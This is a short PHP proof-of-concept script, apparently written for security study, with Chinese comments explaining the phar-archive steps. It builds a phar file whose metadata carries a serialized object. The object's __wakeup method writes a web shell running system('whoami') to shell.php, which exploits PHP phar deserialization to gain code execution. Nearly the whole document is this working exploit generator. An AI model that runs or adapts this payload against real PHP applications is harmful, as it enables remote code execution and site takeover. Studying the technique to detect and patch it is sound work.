<?php
	class test{
		var $test = '123';
		function __wakeup(){
			$fp = fopen("shell.php","w") ;
			fwrite($fp,$this->test);
			fclose($fp);
		}
	}
	@unlink("phar.phar");
	$evilclass = new test();
	$evilclass->test = "<?php system('whoami'); ?>";
	$phar = new Phar("phar.phar"); //后缀名必须为phar
	$phar->startBuffering();
	$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
	$phar->setMetadata($evilclass); //将自定义的meta-data存入manifest
	$phar->addFromString("test.txt", "test"); //添加要压缩的文件
	$phar->stopBuffering();
?>